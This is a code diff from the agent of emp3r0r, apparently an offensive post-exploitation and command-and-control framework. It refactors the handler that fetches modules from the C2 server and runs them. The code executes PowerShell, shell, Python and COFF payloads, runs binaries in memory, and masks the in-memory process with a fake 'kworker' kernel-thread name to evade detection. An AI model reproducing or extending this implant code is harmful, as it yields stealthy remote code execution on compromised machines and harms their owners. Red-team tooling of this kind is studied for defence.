@@ -5,7 +5,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strconv"
 	"strings"
 	"time"
 
@@ -21,14 +20,11 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// ModuleHandler downloads and runs modules from C2
-// env: in format "VAR1=VALUE1,VAR2=VALUE2"
-func ModuleHandler(download_addr, file_to_download, payload_type, modName, checksum, exec_cmd string, env []string, inMem bool) (out string) {
+// ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
+func ModuleHandler(download_addr, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation, inMem bool) (out string) {
 	tarball := filepath.Join(common.RuntimeConfig.AgentRoot, modName+".tar.xz")
 	modDir := filepath.Join(common.RuntimeConfig.AgentRoot, modName)
 	var err error
-
-	env = normalizeEnv(env)
 
 	if payload_type == "coff" && !inMem {
 		return logging.Sprintf("COFF modules must run in memory; set in_memory=true in agent_config")
@@ -54,47 +50,30 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 		}
 	}
 
-	// construct command
-	var (
-		executable string
-		args       = []string{}
-	)
-	fields := strings.Fields(exec_cmd)
-	if !inMem {
-		if len(fields) == 0 {
-			return logging.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
-		}
-		executable = fields[0]
-	}
-
 	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
-		out, err := agentutils.ExecutePowerShell(payload_data, env)
+		out, err := agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
 		if err != nil {
 			return logging.Sprintf("running powershell script: %s (%v)", out, err)
 		}
 		return out
 	case "bash":
-		executable = def.DefaultShell
-		logging.Printf("shell executable: %s", executable)
-		out, err := agentutils.ExecuteShell(payload_data, env)
+		out, err := agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
 		if err != nil {
 			return logging.Sprintf("running shell script: %s (%v)", out, err)
 		}
 		return out
 	case "python":
-		executable = "python"
-		args = []string{exec_cmd}
 		if inMem {
-			out, err := agentutils.ExecutePython(payload_data, env)
+			out, err := agentutils.ExecutePython(payload_data, invocation.Argv, nil)
 			if err != nil {
 				return logging.Sprintf("running python script: %s (%v)", out, err)
 			}
 			return out
 		}
 	case "coff":
-		out, err := runCOFFModule(payload_data, env)
+		out, err := runCOFFModule(payload_data, invocation)
 		if err != nil {
 			return logging.Sprintf("running COFF module: %v", err)
 		}
@@ -106,7 +85,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 				randName := fmt.Sprintf("[kworker/%d:%d-events]", util.RandInt(0, 20), util.RandInt(0, 10))
 				// if you need to pass arguments to the in-memory module, you can do it in environment variables
 				// when implementing the module, you can read the arguments from env
-				out, err = exeutil.InMemExeRun(payload_data, []string{randName}, env)
+				out, err = exeutil.InMemExeRun(payload_data, []string{randName}, nil)
 				if err != nil {
 					out = logging.Sprintf("InMemExeRun: %v", err)
 				}
@@ -120,48 +99,30 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 				return out
 			}
 		}
-	default:
-		// on disk modules
-		args = fields[1:]
 	}
 
-	// interactive modules
-	if executable == "echo" {
-		out = crypto.SHA256SumRaw([]byte(def.MagicString))
-		logging.Printf("echo: %s", out)
-		return
-	}
-
-	// normal on disk modules, run exec_cmd
+	// normal on disk modules, run invocation argv
 	if !inMem {
+		if len(invocation.Argv) == 0 {
+			return logging.Sprintf("no argv specified for module %s", modName)
+		}
 		defer os.Chdir(common.RuntimeConfig.AgentRoot)
-		err = os.Chdir(modDir)
-		if err != nil {
+		if err = os.Chdir(modDir); err != nil {
 			return logging.Sprintf("cd to %s: %v", modDir, err)
 		}
-	}
-	cmd := exec.Command(executable, args...)
-	cmd.Env = env
-	logging.Printf("Running %v (%v)", cmd.Args, cmd.Env)
-	outBytes, err := cmd.CombinedOutput()
-	out = string(outBytes)
-	if err != nil {
-		return logging.Sprintf("running %s: %s (%v)", strconv.Quote(exec_cmd), out, err)
+		cmd := exec.Command(invocation.Argv[0], invocation.Argv[1:]...)
+		if invocation.Stdin != "" {
+			cmd.Stdin = strings.NewReader(invocation.Stdin)
+		}
+		logging.Printf("Running %v", cmd.Args)
+		outBytes, runErr := cmd.CombinedOutput()
+		out = string(outBytes)
+		if runErr != nil {
+			return logging.Sprintf("running %v: %s (%v)", cmd.Args, out, runErr)
+		}
 	}
 
 	return out
-}
-
-func normalizeEnv(env []string) []string {
-	clean := make([]string, 0, len(env))
-	for _, entry := range env {
-		e := strings.TrimSpace(entry)
-		if e == "" {
-			continue
-		}
-		clean = append(clean, e)
-	}
-	return clean
 }
 
 func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
